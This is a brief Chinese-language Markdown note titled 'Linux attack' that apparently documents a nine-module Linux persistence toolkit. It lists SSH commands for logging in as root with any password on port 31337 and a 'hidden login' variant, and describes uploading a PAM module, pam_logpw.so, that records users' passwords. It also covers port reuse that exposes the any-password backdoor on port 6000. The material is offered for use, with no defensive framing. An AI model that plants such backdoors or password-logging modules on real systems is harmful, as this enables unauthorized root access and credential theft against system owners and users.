# Linux攻击



内置9个小模块

![image-20221022002827597](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\image-20221022002827597.png)

ssh root@192.168.3.102 -p 31337              可以任意密码登录

ssh -T root@192.168.5.101 /bin/bash -i -p 31337   隐蔽登录



记录密码的pam_logpw.so

需要上传记录密码目录下的文件pam_logpw.so

有需要自行修改c文件并编译

ssh连接之后可以查看



端口复用默认6000端口复用31337端口任意密码连接：有需要自行修改

ssh root@192.168.3.102 -p 6000

